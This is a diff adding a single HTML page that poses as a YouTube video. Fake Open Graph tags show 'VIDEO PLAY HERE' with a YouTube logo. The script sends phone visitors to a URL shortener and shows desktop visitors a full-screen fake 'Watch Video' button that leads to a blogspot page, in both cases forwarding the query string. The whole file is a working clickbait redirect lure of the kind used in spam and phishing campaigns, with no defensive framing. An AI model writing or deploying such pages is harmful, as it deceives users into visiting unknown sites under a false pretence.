@@ -1,0 +1,83 @@
+
+<html>
+    <head>
+    <meta property="og:title" content="VIDEO PLAY HERE" />
+    <meta property="og:description"        content="Click Here." />
+    <meta property="og:image" content="https://www.youtube.com/yts/img/yt_1200-vfl4C3T0K.png" />
+    </head>
+    <body>
+    <style>
+    .button {
+        background-color: #4CAF50;
+        border: none;
+        color: white;
+        padding: 35px 62px;
+        text-align: center;
+        text-decoration: none;
+        display: inline-block;
+        font-size: 20px;
+        margin: 4px 2px;
+        cursor: pointer;
+    }
+    </style>
+    <p id="demo">
+    
+    </p>
+    <script type="text/javascript">
+    
+    function getDimmentions(){
+        return (window.screen) ? screen: { width: window.outerWidth, height: window.outerHeight}
+    };
+    function detectmob() { 
+     if( navigator.userAgent.match(/Android/i)
+     || navigator.userAgent.match(/webOS/i)
+     || navigator.userAgent.match(/iPhone/i)
+     || navigator.userAgent.match(/iPad/i)
+     || navigator.userAgent.match(/iPod/i)
+     || navigator.userAgent.match(/BlackBerry/i)
+     || navigator.userAgent.match(/Windows Phone/i)
+     ){
+        return true;
+      }
+     else {
+        return false;
+      }
+    };
+    
+
+    
+    
+    function  createButton(text){
+        
+    
+        var button = document.createElement('button');
+        button.innerHTML = text;
+        button.setAttribute("style","position: fixed;font-size: 55px;border-radius: 95px;border: none;outline: none;width: 500px;height: 200px;bottom: 0;top: 0;left: 0;right: 0;margin: auto;background: #2196F3;color: #fff;box-shadow: 0 0 29px #bbb;")   
+        document.body.innerHTML = "";
+        document.body.appendChild(button);
+        return button;
+    
+    
+    }
+    
+    
+    if( detectmob() && getDimmentions().width <= 720 ){
+        window.top.location.href = "https://urlgeni.us/y6er?"+location.search;
+    }else{
+        var BTN = createButton("Watch Video");
+        BTN.addEventListener('click',function(){
+            if(!window.iserButton){
+                window.iserButton = true;
+                BTN.innerHTML = "WAIT...";
+                window.top.location.href = "https://videotrentfull.blogspot.com/?eiurgh4?"+location.search;
+            };
+        });
+    };
+    </script>
+    </body>
+    </html>
+
+
+
+
+
